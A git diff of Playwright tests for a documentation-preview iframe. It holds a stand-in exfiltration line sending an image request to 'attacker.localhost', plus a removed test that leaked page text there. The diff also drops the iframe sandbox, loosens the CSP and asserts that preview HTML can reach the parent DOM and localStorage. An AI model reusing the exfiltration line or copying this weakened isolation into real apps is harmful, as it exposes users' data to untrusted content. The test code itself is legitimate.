@@ -2276,44 +2276,94 @@ test('preview PR context disappears when its catalog group advances or is remove
 })
 
 test('preview HTML keeps changed-document navigation in the preview and unchanged documents in production', async ({ page }) => {
+  const externalResourcePaths = new Set<string>()
+  let insecureResourceReached = false
   await page.route(`**/_previews/sre/revisions/${previewHeadSha}/files/guides/preview.html`, async (route) => {
     const response = await route.fetch()
     const source = await response.text()
     const extraLinks = [
       '<p><a href="preview-guide.md?tab=summary#local-preview-guide">Open the changed Markdown document with query and fragment</a></p>',
       '<p><a href="https://docs.example.test/guide?mode=full#overview">Open external HTTPS documentation</a></p>',
+      '<link rel="stylesheet" href="https://assets.example.test/preview.css">',
+      '<script src="https://assets.example.test/preview.js"></script>',
+      '<img src="https://assets.example.test/preview.svg" alt="External HTTPS mark">',
+      '<style>html { --preview-css-containment: child; }</style>',
       '<script type="module">import "./modules/entry.js";</script>',
-      '<script>const runtimeName = ["preview", "runtime"].join("-") + ".json"; fetch("./" + runtimeName).then(() => { document.body.dataset.runtimeResource = "loaded"; }).catch(() => { document.body.dataset.runtimeResource = "blocked"; });</script>',
+      `<script>
+        document.addEventListener('securitypolicyviolation', (event) => {
+          if (event.blockedURI.includes('attacker.localhost')) document.body.dataset.httpResourceBlocked = event.blockedURI
+        })
+        const blockedImage = new Image()
+        blockedImage.src = 'http://attacker.localhost/preview-exfil'
+        try {
+          parent.document.body.dataset.previewParentDom = 'accessible'
+          localStorage.setItem('issue026-preview-storage', 'accessible')
+          document.body.dataset.parentAccess = 'accessible'
+        } catch {
+          document.body.dataset.parentAccess = 'blocked'
+        }
+        fetch('./preview-runtime.json').then((response) => response.json()).then((data) => {
+          document.body.dataset.runtimeResource = data.status
+        }).catch(() => { document.body.dataset.runtimeResource = 'blocked' })
+      </script>`,
     ].join('')
     await route.fulfill({ response, body: source.replace('</main>', `${extraLinks}</main>`) })
+  })
+  await page.route('**/files/guides/preview-runtime.json', (route) => route.fulfill({
+    status: 200,
+    contentType: 'application/json',
+    body: JSON.stringify({ status: 'loaded' }),
+  }))
+  await page.route('https://assets.example.test/**', (route) => {
+    const pathname = new URL(route.request().url()).pathname
+    externalResourcePaths.add(pathname)
+    if (pathname.endsWith('.css')) return route.fulfill({
+      status: 200,
+      contentType: 'text/css',
+      body: 'body { --external-https-style: loaded; }',
+    })
+    if (pathname.endsWith('.js')) return route.fulfill({
+      status: 200,
+      contentType: 'application/javascript',
+      body: 'document.body.dataset.externalHttpsScript = "loaded";',
+    })
+    return route.fulfill({
+      status: 200,
+      contentType: 'image/svg+xml',
+      body: '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><rect width="1" height="1" fill="blue"/></svg>',
+    })
+  })
+  await page.route('http://attacker.localhost/preview-exfil*', (route) => {
+    insecureResourceReached = true
+    return route.fulfill({ status: 204 })
   })
   await page.route('https://docs.example.test/guide?mode=full', (route) => route.fulfill({
     status: 200,
     contentType: 'text/html',
     body: '<!doctype html><html><body><h1>External guide</h1></body></html>',
   }))
-  const isolatedDocumentResponse = page.waitForResponse((response) => {
-    const url = new URL(response.url())
-    return url.hostname === 'preview.localhost' && url.pathname.endsWith('/guides/preview.html')
-  })
+  const bridgeResponse = page.waitForResponse((response) => new URL(response.url()).pathname === '/preview-bridge.js')
   const moduleResponses = Promise.all(['entry.js', 'dependency.js'].map((name) => page.waitForResponse((response) => {
     const url = new URL(response.url())
-    return url.hostname === 'preview.localhost' && url.pathname.endsWith(`/guides/modules/${name}`)
+    return url.pathname.endsWith(`/guides/modules/${name}`)
   })))
   await page.goto(`/sre/_previews/${previewHeadSha}/guides/preview.html?group=pr%3A42`)
   await expect(page.getByRole('heading', { name: 'Local preview HTML' })).toBeVisible()
   const frame = page.frameLocator('iframe[title="Local preview HTML"]')
   const frameElement = page.locator('iframe[title="Local preview HTML"]')
   const frameSrc = await frameElement.getAttribute('src')
-  expect(new URL(frameSrc!, page.url()).hostname).toBe('preview.localhost')
-  await expect(frameElement).toHaveAttribute('sandbox', 'allow-scripts allow-same-origin')
-  const isolatedResponse = await isolatedDocumentResponse
-  const isolatedCsp = isolatedResponse.headers()['content-security-policy']
-  expect(isolatedCsp).toContain("connect-src 'none'")
-  expect(isolatedCsp).toContain('sandbox allow-scripts allow-same-origin')
-  expect(isolatedCsp).toContain('frame-ancestors http://localhost:* http://127.0.0.1:*')
+  expect(frameSrc).toBe(`/_previews/sre/revisions/${previewHeadSha}/files/guides/preview.html`)
+  expect(new URL(frameSrc!, page.url()).origin).toBe(new URL(page.url()).origin)
+  await expect(frameElement).not.toHaveAttribute('sandbox', /.+/)
+  const rawHtmlResponse = await page.request.get(`/_previews/sre/revisions/${previewHeadSha}/files/guides/preview.html`)
+  const htmlCsp = rawHtmlResponse.headers()['content-security-policy']
+  expect(htmlCsp).toContain('https:')
+  expect(htmlCsp).toContain('/preview-bridge.js')
+  expect(htmlCsp).not.toContain("connect-src 'none'")
+  expect(htmlCsp).not.toContain('sandbox')
+  await bridgeResponse
   await expect(frame.getByRole('heading', { name: 'Local preview HTML' })).toBeVisible()
-  await expect.poll(() => frame.locator('body').evaluate(() => window.location.origin)).toBe(new URL(frameSrc!, page.url()).origin)
+  await expect.poll(() => frame.locator('body').evaluate(() => window.location.origin)).toBe(new URL(page.url()).origin)
   expect((await moduleResponses).map((response) => response.status())).toEqual([200, 200])
   await expect.poll(() => frame.locator('body').getAttribute('data-static-module')).toBe('loaded')
   await expect(frame.getByRole('img', { name: 'Blue preview mark' })).toBeVisible()
@@ -2321,7 +2371,17 @@ test('preview HTML keeps changed-document navigation in the preview and unchange
     await document.fonts.ready
     return document.fonts.check('16px PreviewFixture')
   })).toBeTruthy()
-  await expect.poll(() => frame.locator('body').getAttribute('data-runtime-resource')).toBe('blocked')
+  await expect.poll(() => frame.locator('body').getAttribute('data-runtime-resource')).toBe('loaded')
+  await expect.poll(() => frame.locator('body').getAttribute('data-external-https-script')).toBe('loaded')
+  await expect.poll(() => frame.locator('body').getAttribute('data-http-resource-blocked')).toContain('attacker.localhost')
+  await expect(frame.getByRole('img', { name: 'External HTTPS mark' })).toBeVisible()
+  await expect.poll(() => frame.locator('body').evaluate((body) => getComputedStyle(body).getPropertyValue('--external-https-style').trim())).toBe('loaded')
+  await expect.poll(() => frame.locator('html').evaluate((html) => getComputedStyle(html).getPropertyValue('--preview-css-containment').trim())).toBe('child')
+  expect(await page.locator('html').evaluate((html) => getComputedStyle(html).getPropertyValue('--preview-css-containment').trim())).toBe('')
+  await expect(page.locator('body')).toHaveAttribute('data-preview-parent-dom', 'accessible')
+  await expect.poll(() => page.evaluate(() => localStorage.getItem('issue026-preview-storage'))).toBe('accessible')
+  expect(insecureResourceReached).toBe(false)
+  expect([...externalResourcePaths].sort()).toEqual(['/preview.css', '/preview.js', '/preview.svg'])
   await expect(page.getByRole('link', { name: 'Return to PR #42 ↗' })).toBeVisible()
 
   await expect.poll(() => frame.locator('html').getAttribute('data-preview-fixture')).toBe('loaded')
@@ -2333,7 +2393,11 @@ test('preview HTML keeps changed-document navigation in the preview and unchange
       return 'blocked'
     }
   })
-  expect(parentAccess).toBe('blocked')
+  expect(parentAccess).toBe('accessible')
+  await page.evaluate(() => {
+    delete document.body.dataset.previewParentDom
+    localStorage.removeItem('issue026-preview-storage')
+  })
 
   await frame.getByRole('link', { name: 'Open the changed Markdown document with query and fragment' }).click()
   await expect(page).toHaveURL(`/sre/_previews/${previewHeadSha}/guides/preview-guide.md?group=pr%3A42&tab=summary#local-preview-guide`)
@@ -2358,64 +2422,55 @@ test('preview HTML keeps changed-document navigation in the preview and unchange
   await expect(page.getByRole('button', { name: 'Go to SRE home' })).toBeVisible()
 })
 
-test('a non-loopback app origin keeps the sandboxed srcDoc preview reader bridge', async ({ page }) => {
+test('preview HTML uses the actual app origin and survives direct reload on a non-loopback-equivalent hostname', async ({ page }) => {
   await page.goto('/sre')
   const appOrigin = new URL(page.url())
   appOrigin.hostname = 'preview-app.localhost'
+  await page.route(`**/_previews/sre/revisions/${previewHeadSha}/files/guides/preview.html`, async (route) => {
+    const response = await route.fetch()
+    const source = await response.text()
+    await route.fulfill({
+      response,
+      body: source.replace('</main>', '<script type="module">import "./modules/entry.js";</script></main>'),
+    })
+  })
+  const moduleResponses = Promise.all(['entry.js', 'dependency.js'].map((name) => page.waitForResponse((response) => {
+    const url = new URL(response.url())
+    return url.pathname.endsWith(`/guides/modules/${name}`)
+  })))
   await page.goto(`${appOrigin.origin}/sre/_previews/${previewHeadSha}/guides/preview.html?group=pr%3A42`)
 
   const iframe = page.locator('iframe[title="Local preview HTML"]')
-  await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts')
-  const srcDoc = await iframe.getAttribute('srcdoc')
-  expect(srcDoc).toContain('Content-Security-Policy')
-  expect(srcDoc).toContain("connect-src 'none'")
-  expect(srcDoc).toContain('<base href=')
-  expect(srcDoc).toContain('/preview-bridge.js')
+  await expect(iframe).not.toHaveAttribute('sandbox', /.+/)
+  await expect(iframe).toHaveAttribute('src', `/_previews/sre/revisions/${previewHeadSha}/files/guides/preview.html`)
 
   const frame = page.frameLocator('iframe[title="Local preview HTML"]')
   await expect(frame.getByRole('heading', { name: 'Local preview HTML' })).toBeVisible()
   await expect(frame.getByRole('img', { name: 'Blue preview mark' })).toBeVisible()
+  expect((await moduleResponses).map((response) => response.status())).toEqual([200, 200])
+  await expect.poll(() => frame.locator('body').getAttribute('data-static-module')).toBe('loaded')
   await expect.poll(() => frame.locator('html').getAttribute('data-preview-fixture')).toBe('loaded')
-  const parentAccess = await frame.locator('body').evaluate(() => {
-    try {
-      void window.parent.document
-      return 'accessible'
-    } catch {
-      return 'blocked'
-    }
-  })
-  expect(parentAccess).toBe('blocked')
+  expect(new URL(await iframe.getAttribute('src') ?? '', page.url()).origin).toBe(appOrigin.origin)
 
-  await frame.getByRole('link', { name: 'Open the changed Markdown document' }).click()
+  await page.reload()
+  await expect(page.locator('iframe[title="Local preview HTML"]')).toHaveAttribute('src', `/_previews/sre/revisions/${previewHeadSha}/files/guides/preview.html`)
+  await expect(page.frameLocator('iframe[title="Local preview HTML"]').getByRole('heading', { name: 'Local preview HTML' })).toBeVisible()
+
+  await page.frameLocator('iframe[title="Local preview HTML"]').getByRole('link', { name: 'Open the changed Markdown document' }).click()
   await expect(page).toHaveURL(`${appOrigin.origin}/sre/_previews/${previewHeadSha}/guides/preview-guide.md?group=pr%3A42`)
 })
 
-test('non-loopback srcDoc enforces CSP before malformed preview HTML can load external resources', async ({ page }) => {
-  await page.goto('/sre')
-  const appOrigin = new URL(page.url())
-  appOrigin.hostname = 'preview-app.localhost'
+test('an unavailable preview HTML document is reported after its raw response', async ({ page }) => {
+  const methods: string[] = []
+  await page.route(`**/_previews/sre/revisions/${previewHeadSha}/files/guides/preview.html`, async (route) => {
+    methods.push(route.request().method())
+    await route.fulfill({ status: 404, contentType: 'text/html', body: '<h1>Preview document not found</h1>' })
+  })
 
-  await page.route(`**/_previews/sre/revisions/${previewHeadSha}/files/guides/preview.html`, (route) => route.fulfill({
-    status: 200,
-    contentType: 'text/html; charset=utf-8',
-    body: `<main>private-preview-canary</main><script>
-      document.addEventListener('securitypolicyviolation', (event) => {
-        const marker = document.createElement('p')
-        marker.id = 'preview-csp-blocked-request'
-        marker.textContent = event.blockedURI
-        document.body.append(marker)
-      })
-      const image = new Image()
-      image.src = 'http://attacker.localhost/preview-exfil?value=' + encodeURIComponent(document.body.textContent)
-    </script><head><meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' data: blob:"></head>`,
-  }))
-  await page.goto(`${appOrigin.origin}/sre/_previews/${previewHeadSha}/guides/preview.html?group=pr%3A42`)
-
-  const iframe = page.locator('iframe[title="Local preview HTML"]')
-  await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts')
-  const frame = page.frameLocator('iframe[title="Local preview HTML"]')
-  await expect(frame.locator('body')).toContainText('private-preview-canary')
-  await expect(frame.locator('#preview-csp-blocked-request')).toContainText('attacker.localhost')
+  await page.goto(`/sre/_previews/${previewHeadSha}/guides/preview.html?group=pr%3A42`)
+  await expect(page.getByRole('alert')).toHaveText('This HTML preview document could not be loaded.')
+  await expect(page.locator('iframe[title="Local preview HTML"]')).toHaveCount(0)
+  expect(methods).toEqual(['GET', 'HEAD'])
 })
 
 test('a third-party opaque-origin sandbox cannot read local preview objects', async ({ page }) => {
@@ -2443,25 +2498,6 @@ test('a third-party opaque-origin sandbox cannot read local preview objects', as
 
   expect(result.origin).toBe('null')
   expect(result.readable).toBe(false)
-})
-
-test('isolated preview CSP allows loopback app frames and blocks third-party embedding', async ({ page }) => {
-  await page.goto('/sre')
-  const previewUrl = new URL(`/_previews/sre/revisions/${previewHeadSha}/files/guides/preview.html`, page.url())
-  previewUrl.hostname = 'preview.localhost'
-  const attackerUrl = new URL(page.url())
-  attackerUrl.hostname = 'attacker.localhost'
-  await page.goto(attackerUrl.origin)
-
-  const frameAncestorsViolation = page.waitForEvent('console', (message) => (
-    message.type() === 'error' && message.text().includes('frame-ancestors')
-  ))
-  await page.evaluate((url) => {
-    const frame = document.createElement('iframe')
-    frame.src = url
-    document.body.append(frame)
-  }, previewUrl.href)
-  await frameAncestorsViolation
 })
 
 test('a direct preview document resolves without catalog membership and suppresses stale PR context', async ({ page }) => {
@@ -2500,12 +2536,13 @@ test('a preview-manifest read error stays visible as unknown availability', asyn
 
 test('raw preview resources have real 404s, media types, no-store and no CORS access', async ({ page }) => {
   const base = `/_previews/sre/revisions/${previewHeadSha}/files`
-  const [catalog, manifest, missingRoot, missingSlash, missing, css, script, svg, font, markdown, html, sandboxOrigin, externalOrigin] = await Promise.all([
+  const [catalog, manifest, missingRoot, missingSlash, missing, malformedHtml, css, script, svg, font, markdown, html, nullOrigin, externalOrigin] = await Promise.all([
     page.request.get('/_previews/sre/catalog.json'),
     page.request.get(`/_previews/sre/revisions/${previewHeadSha}/manifest.json`),
     page.request.get('/_previews'),
     page.request.get('/_previews/'),
     page.request.get(`${base}/missing.css`),
+    page.request.get('/_previews/sre/unversioned/guides/preview.html'),
     page.request.get(`${base}/assets/preview.css`),
     page.request.get(`${base}/assets/preview.js`),
     page.request.get(`${base}/assets/mark.svg`),
@@ -2526,19 +2563,28 @@ test('raw preview resources have real 404s, media types, no-store and no CORS ac
   expect((await missingSlash.text()).toLowerCase()).not.toContain('<div id="root">')
   expect(missing.status()).toBe(404)
   expect((await missing.text()).toLowerCase()).not.toContain('<div id="root">')
+  expect(malformedHtml.status()).toBe(404)
+  expect(malformedHtml.headers()['content-security-policy']).toContain("script-src 'none'")
   expect(css.headers()['content-type']).toContain('text/css')
   expect(script.headers()['content-type']).toContain('javascript')
   expect(svg.headers()['content-type']).toContain('image/svg+xml')
   expect(font.headers()['content-type']).toContain('font/woff2')
   expect(markdown.headers()['content-type']).toContain('text/markdown')
+  expect(html.headers()['content-type']).toContain('text/html')
   expect(html.headers()['cache-control']).toContain('no-store')
   for (const response of [catalog, manifest, css, script, svg, font, markdown, html]) {
     expect(response.headers()['cache-control']).toContain('no-store')
   }
-  expect(html.headers()['content-security-policy']).toContain("script-src 'none'")
+  const htmlCsp = html.headers()['content-security-policy']
+  expect(htmlCsp).toContain('script-src')
+  expect(htmlCsp).toContain('https:')
+  expect(htmlCsp).not.toContain("script-src 'none'")
+  expect(htmlCsp).not.toContain("connect-src 'none'")
+  expect(htmlCsp).not.toContain('sandbox')
+  expect(markdown.headers()['content-security-policy']).toContain("script-src 'none'")
   expect(html.headers()['x-content-type-options']).toBe('nosniff')
-  expect(sandboxOrigin.headers()['access-control-allow-origin']).toBeUndefined()
-  expect(sandboxOrigin.headers()['vary']).toBeUndefined()
+  expect(nullOrigin.headers()['access-control-allow-origin']).toBeUndefined()
+  expect(nullOrigin.headers()['vary']).toBeUndefined()
   expect(externalOrigin.headers()['access-control-allow-origin']).toBeUndefined()
   expect(externalOrigin.headers()['vary']).toBeUndefined()
 })
